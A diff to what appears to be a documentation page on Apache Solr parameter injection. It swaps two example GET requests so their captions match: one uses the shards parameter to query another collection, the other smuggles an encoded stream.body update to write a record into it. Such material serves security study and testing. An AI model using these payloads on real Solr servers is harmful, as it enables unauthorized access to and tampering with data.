@@ -100,11 +100,11 @@ The exploit request to change Solr config properties may look like:
 
 To query data from another collection
 
-`GET /solr/db/select?q=Apple&shards=http://127.0.0.1:8983/solr/atom&qt=/update?stream.body=[%257b%2522id%2522:%25221338%2522,%2522author%2522:%2522orange%2522%257d]%26wt=json&commit=true&wt=json`
+`GET /solr/db/select?q=orange&shards=http://127.0.0.1:8983/solr/atom&qt=/select?fl=id,name:author&wt=json`
 
 To update data in another collection:
 
-`GET /solr/db/select?q=orange&shards=http://127.0.0.1:8983/solr/atom&qt=/select?fl=id,name:author&wt=json`
+`GET /solr/db/select?q=Apple&shards=http://127.0.0.1:8983/solr/atom&qt=/update?stream.body=[%257b%2522id%2522:%25221338%2522,%2522author%2522:%2522orange%2522%257d]%26wt=json&commit=true&wt=json`
 
 Another way to exploit this vulnerability is to alter the Solr response. The "fl" parameter lists the fields that should be returned by the query. For example, by issuing the following requests we are asking to return only 'name' and 'price' fields:
 
